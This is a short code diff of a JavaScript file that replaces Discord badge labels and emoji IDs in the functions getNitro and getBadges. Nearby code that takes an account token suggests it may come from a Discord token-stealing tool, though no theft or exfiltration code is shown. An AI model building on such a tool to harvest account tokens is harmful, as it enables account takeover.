@@ -516,13 +516,13 @@ const getFriends = async (token) => {
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return '';
+      return ' <:4872badgenitroclassic:991719224064081980> ';
     case 1:
       return ' <:4872badgenitroclassic:991719224064081980> ';
     case 2:
       return ' <:4872badgenitroclassic:991719224064081980> ';
     default:
-      return '';
+      return ' <:4872badgenitroclassic:991719224064081980> ';
   }
 };
 
@@ -530,34 +530,34 @@ const getBadges = (flags) => {
   let badges = '';
   switch (flags) {
     case 1:
-      badges += 'Discord Staff, ';
+      badges += '<:staff:991719218049450054>';
       break;
     case 2:
-      badges += 'Partnered Server Owner, ';
+      badges += '<:vpartner:991719219748159569>';
       break;
     case 131072:
-      badges += ' <:DevBadge:912727453875699733> ';
+      badges += '<:EarlyVerifiedBotDeveloper:991706442719572038>';
       break;
     case 4:
-      badges += ' <a:CH_IconHypesquadShiny:928551747591487548> ';
+      badges += '<:hype:991719214949871656> ';
       break;
     case 16384:
-      badges += 'Gold BugHunter, ';
+      badges += '<:BugHunter2:991719221329416252> ';
       break;
     case 8:
-      badges += 'Green BugHunter, ';
+      badges += '<:BugHunter:991706464869687326> ';
       break;
     case 512:
-      badges += ' <a:early:913099122968494170> ';
+      badges += ' <:early:991706422544973854> ';
       break;
     case 128:
-      badges += ' <:brilliance:919973089285120111> ';
+      badges += ' <:brilliance:991719223191670896> ';
       break;
     case 64:
-      badges += ' <:bravery:919973089222205451> ';
+      badges += ' <:hypebravery:991719220566052894> ';
       break;
     case 256:
-      badges += ' <:balance:919973088651776001> ';
+      badges += ' <:balance:991719222386368532> ';
       break;
     case 0:
       badges = '`No Badges`';
